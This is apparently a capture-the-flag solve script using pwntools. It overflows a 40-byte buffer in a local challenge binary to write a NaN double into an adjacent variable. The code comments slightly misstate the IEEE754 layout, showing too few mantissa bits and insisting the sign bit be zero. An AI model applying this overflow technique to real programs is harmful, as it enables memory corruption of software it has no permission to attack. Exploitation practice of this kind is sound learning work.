from pwn import *

binary = ELF('./chal')
p = process(binary.path)

# The buffer is 40 chars in length, so we need to fill it up, and then add the
# IEEE754 representation of NaN beyond the end of the buffer, and into num.
# NaN is given by IEEE754 as:
# (0b) 0 11111111111 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,
# (0x) 7FFXXXXXXXXXXXXX,
# So, where the sign bit must be zero, the Exponent entries must be filled, and
# the X's cover the mantissa, and *must* be a non-zero value overall.

payload = b'A' * 40
payload += p64(0x7ff0000000000001)

p.sendline(payload)
print(f"Payload: {payload}")

# Receive and print output
print(p.recvall().decode())
